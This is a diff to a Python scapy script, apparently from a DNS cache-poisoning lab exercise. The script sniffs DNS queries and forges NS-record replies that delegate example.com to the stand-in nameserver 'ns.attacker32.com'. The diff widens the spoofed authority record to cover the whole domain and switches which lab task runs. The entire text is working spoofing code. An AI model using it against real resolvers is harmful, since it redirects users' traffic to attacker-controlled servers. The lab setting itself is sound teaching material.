@@ -3,7 +3,7 @@ from scapy.layers.dns import DNS, DNSQR, DNSRR
 from scapy.layers.inet import IP, UDP
 
 ATTACKER_NS = "ns.attacker32.com"
-ATTACKER_IFACE = "br-a09e48475a68"
+ATTACKER_IFACE = "br-1d14f48d1aa5"
 
 
 class Task:
@@ -50,13 +50,14 @@ class Task:
     @staticmethod
     def _3():
 
-        TARGET = "example.com"
+        TARGET_QRY = "_.example.com"
+        TARGET_REPLY = "example.com"
 
         def spoof_dns_ns(pkt):
             if (
                 pkt.haslayer(DNS)
                 and pkt.haslayer(DNSQR)
-                and TARGET in pkt[DNSQR].qname.decode("utf-8")
+                and TARGET_QRY in pkt[DNSQR].qname.decode("utf-8")
                 and pkt[DNS].qr == 0
             ):
                 print(f"Got DNS Query: {pkt[IP].summary()}")
@@ -71,7 +72,7 @@ class Task:
                         nscount=1,
                         qd=pkt[DNS].qd,
                         ns=DNSRR(
-                            rrname=pkt[DNSQR].qname,
+                            rrname=TARGET_REPLY.encode(),
                             type="NS",
                             rclass="IN",
                             ttl=86400,
@@ -90,4 +91,4 @@ class Task:
 
 
 if __name__ == "__main__":
-    Task()._1()
+    Task()._3()
